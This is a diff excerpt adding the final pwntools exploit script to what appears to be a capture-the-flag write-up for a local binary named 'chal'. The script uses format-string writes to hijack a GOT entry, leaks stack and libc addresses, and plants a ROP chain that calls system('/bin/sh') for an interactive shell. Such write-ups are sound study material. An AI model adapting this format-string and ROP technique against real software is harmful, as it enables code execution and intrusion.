@@ -217,4 +217,91 @@ p.interactive()
 
 <img width="657" height="316" alt="image" src="https://github.com/user-attachments/assets/d22e07dc-ee95-48ae-94ff-9de73185c5d7" />
 
+final script:
+```python
+from pwn import *
 
+context.arch = "amd64"
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
+
+context.binary = exe = ELF("./chal", checksec=False)
+context.log_level = "debug"
+
+p = process(exe.path)
+
+def GDB():
+	gdb.attach(p, gdbscript='''
+		handle SIGALRM ignore
+		br *0x4014c8
+		br *0x4014f0
+		''')
+
+GDB()
+
+password = b"Lost_in_Light"
+
+p.sendlineafter(b">>> ", password)
+
+## 1 ######################
+vuln_addr = 0x401448
+# vuln_addr = 0x401453
+payload = fmtstr_payload(6, {exe.got['system']: vuln_addr})
+
+p.sendlineafter(b">>> ", payload)
+
+## 2 ######################
+# payload = b"%p %30$p"
+payload = b"%p %49$p"
+p.sendlineafter(b">>> ", payload)
+
+p.recvuntil(b"hello ")
+leak_data = p.recvline().strip().split()
+addr = int(leak_data[0], 16)
+leak_libc = int(leak_data[1], 16)
+# rip = addr + 0x250
+rip = addr + 0x308
+libc.address = leak_libc - 0x29ca8 
+print(f"[+] Data leaks and calculation: ")
+print(f"addr: {hex(addr)}")
+print(f"libc: {hex(leak_libc)}")
+print(f"rip: {hex(rip)}")
+print(f"libc_base: {hex(libc.address)}")
+
+## 3 ######################
+rop = ROP(libc)
+pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
+ret = 0x0000000000401016
+bin_sh = next(libc.search(b"/bin/sh"))
+system = libc.symbols['system']
+
+print(f"pop_rdi: {hex(pop_rdi)}")
+print(f"ret: {hex(ret)}")
+print(f"bin_sh: {hex(bin_sh)}")
+print(f"system: {hex(system)}")
+
+payload1 = {
+    rip:     pop_rdi,
+    rip + 8: bin_sh
+}
+
+payload2 = {
+    rip + 16: ret,     
+    rip + 24: system
+}
+
+payload = fmtstr_payload(6, payload1, write_size='short')
+print(f"Payload-1 length: {len(payload)}")
+p.sendlineafter(b">>> ", payload)
+
+payload = fmtstr_payload(6, payload2, write_size='short')
+print(f"Payload-2 length: {len(payload)}")
+p.sendlineafter(b">>> ", payload)
+
+## 4 ######################
+print(f"[+] Changing system to printf: \n")
+payload = fmtstr_payload(6, {exe.got['system']: libc.symbols['printf']})
+print(f"- Payload length: {len(payload)}")
+p.sendlineafter(b">>> ", payload)
+
+p.interactive()
+```
